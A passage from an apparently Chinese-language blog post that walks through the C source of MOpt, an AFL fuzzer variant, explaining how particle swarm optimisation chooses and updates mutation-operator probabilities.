class=\"number\">0</span>;</span><br><span class=\"line\">              w_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">for</span> (tmp_swarm = <span class=\"number\">0</span>; tmp_swarm &lt; swarm_num; tmp_swarm++)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">              <span class=\"type\">double</span> total_puppet_temp = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">              swarm_fitness[tmp_swarm] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                      stage_finds_puppet[tmp_swarm][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                      probability_now[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">                      x_now[tmp_swarm][i] = ((<span class=\"type\">double</span>)(random() % <span class=\"number\">7000</span>)*<span class=\"number\">0.0001</span> + <span class=\"number\">0.1</span>);</span><br><span class=\"line\">                      total_puppet_temp += x_now[tmp_swarm][i];</span><br><span class=\"line\">                      v_now[tmp_swarm][i] = <span class=\"number\">0.1</span>;</span><br><span class=\"line\">                      L_best[tmp_swarm][i] = <span class=\"number\">0.5</span>;</span><br><span class=\"line\">                      G_best[i] = <span class=\"number\">0.5</span>;</span><br><span class=\"line\">                      eff_best[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++) &#123;</span><br><span class=\"line\">                      stage_cycles_puppet_v2[tmp_swarm][i] = stage_cycles_puppet[tmp_swarm][i];</span><br><span class=\"line\">                      stage_finds_puppet_v2[tmp_swarm][i] = stage_finds_puppet[tmp_swarm][i];</span><br><span class=\"line\">                      x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / total_puppet_temp;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"type\">double</span> x_temp = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                      probability_now[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">                      v_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);</span><br><span class=\"line\"></span><br><span class=\"line\">                      x_now[tmp_swarm][i] += v_now[tmp_swarm][i];</span><br><span class=\"line\"></span><br><span class=\"line\">                      <span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &gt; v_max)</span><br><span class=\"line\">                              x_now[tmp_swarm][i] = v_max;</span><br><span class=\"line\">                      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &lt; v_min)</span><br><span class=\"line\">                              x_now[tmp_swarm][i] = v_min;</span><br><span class=\"line\"></span><br><span class=\"line\">                      x_temp += x_now[tmp_swarm][i];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                      x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;</span><br><span class=\"line\">                      <span class=\"keyword\">if</span> (likely(i != <span class=\"number\">0</span>))</span><br><span class=\"line\">                              probability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - <span class=\"number\">1</span>] + x_now[tmp_swarm][i];</span><br><span class=\"line\">                      <span class=\"keyword\">else</span></span><br><span class=\"line\">                              probability_now[tmp_swarm][i] = x_now[tmp_swarm][i];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &lt; <span class=\"number\">0.99</span> || probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &gt; <span class=\"number\">1.01</span>)</span><br><span class=\"line\">                  FATAL(<span class=\"string\">&quot;ERROR probability&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">              core_operator_finds_puppet[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_finds_puppet_v2[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_cycles_puppet[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_cycles_puppet_v2[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_cycles_puppet_v3[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-2-select-algorithm\">0x2.2.select_algorithm()</h3>\n<p>根据PSO获得的概率分布，选择不同的变异算法</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">select_algorithm</span><span class=\"params\">(<span class=\"type\">int</span> extras)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> i_puppet, j_puppet;</span><br><span class=\"line\">  <span class=\"comment\">//double total_puppet = 0.0;</span></span><br><span class=\"line\"><span class=\"comment\">//srandom(time(NULL));</span></span><br><span class=\"line\"></span><br><span class=\"line\">    u32 seed[<span class=\"number\">2</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    ck_read(dev_urandom_fd, &amp;seed, <span class=\"keyword\">sizeof</span>(seed), <span class=\"string\">&quot;/dev/urandom&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    srandom(seed[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//double sele = ((double)(random()%10000)*0.0001);</span></span><br><span class=\"line\">  <span class=\"comment\">//SAYF(&quot;select : %f\\n&quot;,sele);</span></span><br><span class=\"line\">  j_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> operator_number = operator_num;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (extras &lt; <span class=\"number\">2</span>) operator_number = operator_number - <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"type\">double</span> range_sele = (<span class=\"type\">double</span>)probability_now[swarm_now][operator_number - <span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"type\">double</span> sele = ((<span class=\"type\">double</span>)(random() % <span class=\"number\">10000</span>) * <span class=\"number\">0.0001</span> * range_sele);</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">// 这里的probability_now由pso_uadating()确定</span></span><br><span class=\"line\"><span class=\"comment\">// probability_now是一个概率的前缀和数组，</span></span><br><span class=\"line\"><span class=\"comment\">// 最后一位也就是probability_now[swarm_now][operator_number - 1]应该为1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i_puppet = <span class=\"number\">0</span>; i_puppet &lt; operator_number; i_puppet++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (unlikely(i_puppet == <span class=\"number\">0</span>))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (sele &lt; probability_now[swarm_now][i_puppet])</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (sele &lt; probability_now[swarm_now][i_puppet])</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">              j_puppet =<span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"comment\">// 由上面对于sele的分析，可以知道这里是按照对应的概率设置i_puppet</span></span><br><span class=\"line\">  <span class=\"comment\">// i_puppet对应选择到的操作</span></span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((j_puppet ==<span class=\"number\">1</span> &amp;&amp; sele &lt; probability_now[swarm_now][i_puppet<span class=\"number\">-1</span>]) || (i_puppet + <span class=\"number\">1</span> &lt; operator_num &amp;&amp; sele &gt; probability_now[swarm_now][i_puppet +  <span class=\"number\">1</span>]))</span><br><span class=\"line\">    FATAL(<span class=\"string\">&quot;error select_algorithm&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i_puppet;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-2-fuzz-one\">0x2.2.fuzz_one()</h3>\n<p>fuzz_one() 是完成Mutation operators的核心流程，在main()中每一次fuzz循环中被调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> u8 <span class=\"title function_\">fuzz_one</span><span class=\"params\">(<span class=\"type\">char</span>** argv)</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> key_val_lv = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (limit_time_sig == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\tkey_val_lv = normal_fuzz_one(argv);</span><br><span class=\"line\">    \t<span class=\"comment\">// normal_fuzz_one() 是原来AFL的fuzz_one()</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (key_module == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\tkey_val_lv = pilot_fuzzing(argv);</span><br><span class=\"line\">        \t<span class=\"comment\">// 对应0x1.2.3.Main Framework 中的pilot fuzzing module</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (key_module == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\tkey_val_lv = core_fuzzing(argv);</span><br><span class=\"line\">        \t<span class=\"comment\">// 对应core fuzzing module</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (key_module == <span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t\tpso_updating();</span><br><span class=\"line\">        \t<span class=\"comment\">// 对应PSO updating module</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> key_val_lv;\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-3-pilot-fuzzing\">0x2.3.pilot_fuzzing()</h3>\n<p>这是整个MOpt的核心模块，他是在原AFL的基础上修改得到的，所以主要分析和原AFL的差异部分。</p>\n<p>core_pilot与此类似，所以不做单独分析</p>\n<h4 id=\"0x2-3-1-Pacemaker-Fuzzing-Mode\">0x2.3.1.Pacemaker Fuzzing Mode</h4>\n<p>由于deterministic stage的小型改动在前期比较有用，在后期长时间处于deterministic stage会导致效率下降，所以在原fuzz_one() 直接跳到havoc_stage() 的逻辑后面，增加一个时间判断，判断是否要直接跳到havoc_stage()</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// line 6999 in afl_fuzz.c</span></span><br><span class=\"line\"></span><br><span class=\"line\">cur_ms_lv = get_cur_time();</span><br><span class=\"line\"><span class=\"comment\">// 获取当前时间</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!(key_puppet == <span class=\"number\">0</span> &amp;&amp; ((cur_ms_lv - last_path_time &lt; limit_time_puppet) </span><br><span class=\"line\">        (last_crash_time != <span class=\"number\">0</span> &amp;&amp; cur_ms_lv - last_crash_time &lt; limit_time_puppet) || last_path_time == <span class=\"number\">0</span>)))</span><br><span class=\"line\"><span class=\"comment\">// 如果距离上一次crash或者找到新路径的时间，超过了通过-L参数设置的limit_time_puppet</span></span><br><span class=\"line\"><span class=\"comment\">// 说明长时间陷入了deterministic stage</span></span><br><span class=\"line\"><span class=\"comment\">// 直接跳过deterministic stage进入havoc_stage()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        key_puppet = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> pacemaker_fuzzing;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x2-3-2-Mutation-operators-select\">0x2.3.2.Mutation operators select</h4>\n<p>在havoc阶段，要进行变异策略的选择，相比于原来的随机选择，MOpt根据PSO得到的概率分布进行策略的选择</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// line 8165 in afl-fuzz.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span> (select_algorithm( extras_cnt + a_extras_cnt )) </span><br></pre></td></tr></table></figure>\n<h4 id=\"0x2-3-3-Before-return\">0x2.3.3.Before return</h4>\n<p>返回前新增的一些变化</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (key_puppet == <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">//一个小型的flag</span></span><br><span class=\"line\"><span class=\"comment\">//在前面pacemaker的跳转时被设置为1</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (unlikely(queued_paths + unique_crashes &gt; ((queued_paths + unique_crashes)*limit_time_bound + orig_hit_cnt_puppet)))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                key_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">                cur_ms_lv = get_cur_time();</span><br><span class=\"line\">                new_hit_cnt = queued_paths + unique_crashes;</span><br><span class=\"line\">                orig_hit_cnt_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">                last_limit_time_start = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 还原并更新一些变量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (unlikely(tmp_pilot_time &gt; period_pilot))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        total_pacemaker_time += tmp_pilot_time;</span><br><span class=\"line\">        new_hit_cnt = queued_paths + unique_crashes;</span><br><span class=\"line\">        swarm_fitness[swarm_now] = (<span class=\"type\">double</span>)(total_puppet_find - temp_puppet_find) / ((<span class=\"type\">double</span>)(tmp_pilot_time)/ period_pilot_tmp);</span><br><span class=\"line\">        tmp_pilot_time = <span class=\"number\">0</span>;</span><br><span class=\"line\">        temp_puppet_find = total_puppet_find;</span><br><span class=\"line\"></span><br><span class=\"line\">        u64 temp_stage_finds_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                <span class=\"type\">double</span> temp_eff = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (stage_cycles_puppet_v2[swarm_now][i] &gt; stage_cycles_puppet[swarm_now][i])</span><br><span class=\"line\">                        temp_eff = (<span class=\"type\">double</span>)(stage_finds_puppet_v2[swarm_now][i] - stage_finds_puppet[swarm_now][i]) /</span><br><span class=\"line\">                        (<span class=\"type\">double</span>)(stage_cycles_puppet_v2[swarm_now][i] - stage_cycles_puppet[swarm_now][i]);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (eff_best[swarm_now][i] &lt; temp_eff)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        eff_best[swarm_now][i] = temp_eff;</span><br><span class=\"line\">                        L_best[swarm_now][i] = x_now[swarm_now][i];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            \t<span class=\"comment\">// 找到particle对应的历史最优概率分布</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">// 更新L_best</span></span><br><span class=\"line\">                stage_finds_puppet[swarm_now][i] = stage_finds_puppet_v2[swarm_now][i];</span><br><span class=\"line\">                stage_cycles_puppet[swarm_now][i] = stage_cycles_puppet_v2[swarm_now][i];</span><br><span class=\"line\">                temp_stage_finds_puppet += stage_finds_puppet[swarm_now][i];</span><br><span class=\"line\">            \t<span class=\"comment\">// 更新一些和计算 生成的好的test case数量 相关的变量</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        swarm_now = swarm_now + <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (swarm_now == swarm_num)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                key_module = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        core_operator_cycles_puppet_v2[i] = core_operator_cycles_puppet[i];</span><br><span class=\"line\">                        core_operator_cycles_puppet_v3[i] = core_operator_cycles_puppet[i];</span><br><span class=\"line\">                        core_operator_finds_puppet_v2[i] = core_operator_finds_puppet[i];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">// 更新一些和计算 生成的好的test case数量 相关的变量</span></span><br><span class=\"line\">                <span class=\"type\">double</span> swarm_eff = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">                swarm_now = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; swarm_num; i++)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (swarm_fitness[i] &gt; swarm_eff)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                                swarm_eff = swarm_fitness[i];</span><br><span class=\"line\">                                swarm_now = i;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            \t<span class=\"comment\">// 选择最好的swarm</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (swarm_now &lt;<span class=\"number\">0</span> || swarm_now &gt; swarm_num - <span class=\"number\">1</span>)</span><br><span class=\"line\">                        PFATAL(<span class=\"string\">&quot;swarm_now error number  %d&quot;</span>, swarm_now);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-4-pso-updating\">0x2.4.pso_updating()</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">pso_updating</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tg_now += <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (g_now &gt; g_max) g_now = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tw_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end; </span><br><span class=\"line\">\t<span class=\"type\">int</span> tmp_swarm, i, j;</span><br><span class=\"line\">\tu64 temp_operator_finds_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\toperator_finds_puppet[i] = core_operator_finds_puppet[i];</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; swarm_num; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\toperator_finds_puppet[i] = operator_finds_puppet[i] + stage_finds_puppet[j][i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttemp_operator_finds_puppet = temp_operator_finds_puppet + operator_finds_puppet[i];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 计算变异产生的好test cese的个数</span></span><br><span class=\"line\">    <span class=\"comment\">// 为更新G_best()做准备</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (operator_finds_puppet[i])</span><br><span class=\"line\">\t\t\tG_best[i] = (<span class=\"type\">double</span>)((<span class=\"type\">double</span>)(operator_finds_puppet[i]) / (<span class=\"type\">double</span>)(temp_operator_finds_puppet)); </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"comment\">// 更新G_best()，即PSO中的全局最优分布</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (tmp_swarm = <span class=\"number\">0</span>; tmp_swarm &lt; swarm_num; tmp_swarm++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">double</span> x_temp = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprobability_now[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">\t\t\tv_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);</span><br><span class=\"line\">\t\t\tx_now[tmp_swarm][i] += v_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &gt; v_max)</span><br><span class=\"line\">\t\t\t\tx_now[tmp_swarm][i] = v_max;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &lt; v_min)</span><br><span class=\"line\">\t\t\t\tx_now[tmp_swarm][i] = v_min;</span><br><span class=\"line\">\t\t\tx_temp += x_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 根据pso算法更新v_now数组和x_now数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tx_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (likely(i != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t\t\t\tprobability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - <span class=\"number\">1</span>] + x_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span 